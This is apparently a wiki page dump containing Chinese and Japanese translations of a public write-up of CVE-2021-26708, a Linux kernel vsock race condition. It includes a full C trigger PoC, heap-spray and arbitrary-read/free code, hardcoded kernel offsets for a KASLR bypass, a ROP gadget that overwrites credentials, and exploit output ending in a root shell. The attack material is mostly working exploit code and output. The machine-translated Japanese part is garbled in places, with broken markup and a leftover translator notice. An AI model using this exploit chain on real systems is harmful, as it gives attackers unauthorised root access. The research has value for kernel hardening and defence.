        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/div&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===任意讀的步驟===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/div&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>9baegq4s0ogee6ruj42ataz97luvne5</sha1>
    </revision>
    <revision>
      <id>2261</id>
      <parentid>2233</parentid>
      <timestamp>2021-05-05T05:35:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "このフラグは、メッセージデータをメッセージキューから削除することなく、カーネルがユーザースペースにコピーすることを意..."</comment>
      <origin>2261</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="28937" sha1="a09jwb2t4t0amox45iy8j67wqk4z781" xml:space="preserve">&lt;languages  /&gt;
==脆弱性==

これらの脆弱性は、&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;の誤ロックによる条件闘争が原因です。 これらの条件闘争は、VSOCKマルチトランスファーのサポートを追加した2019年11月のコミットで暗黙のうちに導入され、Linuxカーネルバージョン5.5-rc1にマージされました。

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;と&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;は、すべての主要なGNU/Linuxディストリビューションのカーネルモジュールとして提供されています。 これらの脆弱なモジュールは、AF_VSOCKドメインのソケットを作成した際に自動的にロードされます。
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;code&gt;AF_VSOCK&lt;/code&gt;のソケット作成は、非特権ユーザが利用でき、ユーザ名空間を必要としません。


メモリの破損

以下は、CVE-2021-26708の悪用についての詳細です。この悪用は、&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;の条件付き競争を利用しており、回復には2つのスレッドが必要で、最初のスレッドが&lt;code&gt;setsockopt()&lt;/code&gt;を呼び出します。
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



2番目のスレッドは、&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;がソケットロックを取得しようとしたときに、仮想ソケットのトランスポートを変更しますが、これは仮想ソケットを再接続することで実現します。
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


仮想ソケットの&lt;code&gt;connect()&lt;/code&gt;を処理するために、カーネルは&lt;code&gt;vsock_assign_transport()&lt;/code&gt;を呼び出した&lt;code&gt;vsock_stream_connect()&lt;/code&gt;を実行します。 この関数には以下のコードが含まれています。
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt;vsock_stream_connect()&lt;/code&gt;にはソケットロックがあり、並列スレッドの&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;もソケットロックを取得しようとするため、条件付きの競合となります。 その結果、異なる&lt;code&gt;svm_cid&lt;/code&gt;で2回目の&lt;code&gt;connect()&lt;/code&gt;を実行した際に、&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;関数が呼び出されます。 この関数は、&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;を実行し、&lt;code&gt;vsock_sock.trans&lt;/code&gt;を解放し、&lt;code&gt;vsk-&gt;transport&lt;/code&gt;をNULLに設定する。 stream_connect()&lt;/code&gt;がソケットのロックを解除することで、&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;の実行を継続することができます。 &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;を呼び出し、続いて&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;を呼び出します。 ここでtransportは、&lt;code&gt;vsk-&gt;transport&lt;/code&gt;に一致しないローカル変数からの廃止された値を含んでいます（原因はNULLに設定されています）。

www.DeepL.com/Translator（無料版）で翻訳しました。

カーネルが&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;を実行すると、メモリが破壊されます。
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

ここで，vvsはカーネルメモリへのポインタであり，&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;で解放されている。&lt;code&gt;struct virtio_vsock_sock&lt;/code&gt; は 64 バイトのサイズで、kmalloc-64 ブロックキャッシュに配置されています。&lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE is 0xFFFFFFFFUL&lt;/code&gt; &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE is 0xFFFFFFFFUL&lt;/code&gt; buf_alloc フィールドタイプは u32 で、オフセット 40 にある。valの値は攻撃者が制御し、その最下位4バイトが解放されたメモリに書き込まれます。


ファジーテスト

syzkaller fuzzerにはこのクラッシュを再現する方法がないので、自分で調べてみることにしました。 しかし、なぜfuzzerは失敗するのか？ &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;を見てみると、次のようなことがわかりました。
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;code&gt;notify_buffer_size()&lt;/code&gt;はvalが現在のbuffer_sizeと異なる場合にのみ呼び出され、&lt;code&gt;setsockopt()&lt;/code&gt;は&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;を実行します。 code&gt;の場合、sizeパラメータは呼び出されるたびに異なるはずです。 そこで、コードを作ってみました。
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

ここでのサイズの値は、&lt;code&gt;clock_gettime()&lt;/code&gt;が返すナノ秒の数から取得されるため、毎回異なる値になる可能性があります。 オリジナルの syzkaller では、syscall パラメータの値は syzkaller がファジング入力を生成する際に決定され、実行時には変更されないため、この処理は行われません。

四字熟語の威力

ここでは、研究対象としてFedora 33 Serverを選び、カーネルバージョン5.10.11-200.fc33.x86_64で、SMEPとSMAPを回避することにしました。

その第一歩として、私は安定したヒープイジェクションに取り組み始めました。これは、ユーザースペースを実行する活動を利用して、カーネルが解放されたvirtio_vsock_sockの場所に別の64バイトのオブジェクトを割り当てるようにするものです。 数回の実験の後、リリースされた virtio_vsock_sock が上書きされていることが確認され、ヒープインジェクションが実行可能であることがわかりました。 最終的に msgsnd() システムコールを見つけました。これはカーネル空間で msg_msg 構造体を作成します。
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

表はメッセージのヘッダー、裏はメッセージのデータです。 ユーザ空間の struct msgbuf に 16 バイトの mtext がある場合、対応する msg_msg が kmalloc-64 ブロック・キャッシュに作成されます。 4 バイトの write-after-free により、オフセット 40 の void *security ポインタが破壊されます。msg_msg.securityフィールドは、msg_msgを受信したときに、lsm_msg_alloc()によって割り当てられ、security_msg_msg_free()によって解放されたカーネルデータを指します。 このように、セキュリティ・ポインターの前半部分を壊すことで、任意の自由を得ることができます。

社内コア情報の漏洩

Used here [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6% BC%8F%E6%B4%9E CVE-2019-18683]で同じ仕掛けをしています。 バーチャルソケットの2回目のconnect()では、&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;を呼び出し、&lt;code&gt;vsk-&gt;transport&lt;/code&gt;をNULLに設定することで、&lt;code&gt;vsock_stream_setsockopt()&lt;? /code&gt;call &lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;の後に、カーネルアラームでメモリクラッシュが発生したことがあります。
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
gdbによるデバッグで、RCXレジスタには解放されたvirtio_vsock_sockのカーネルアドレスが、RBXレジスタにはvsock_sockのカーネルアドレスが入っていることがわかりました。

どこでも読める

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

リークされたカーネルアドレスからのオブジェクトの解放
ヒープスプレーを行い、制御されたデータでオブジェクトを上書きする
破損したオブジェクトを特権昇格に利用する
System V メッセージのカーネルの実装では、DATALEN_MSG の最大値は、PAGE_SIZE から sizeof(struct msg_msg)を引いた値に制限されています。) より大きなメッセージを送信した場合、残りのメッセージはメッセージセグメントのリストに保存されます。msg_msgは、最初のセグメントを指すstruct msg_msgseg *nextと、サイズを格納する size_t m_tsを含んでいます。 上書き操作を行うと、制御された値が msg_msg.m_ts と msg_msg.next に配置されます。

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
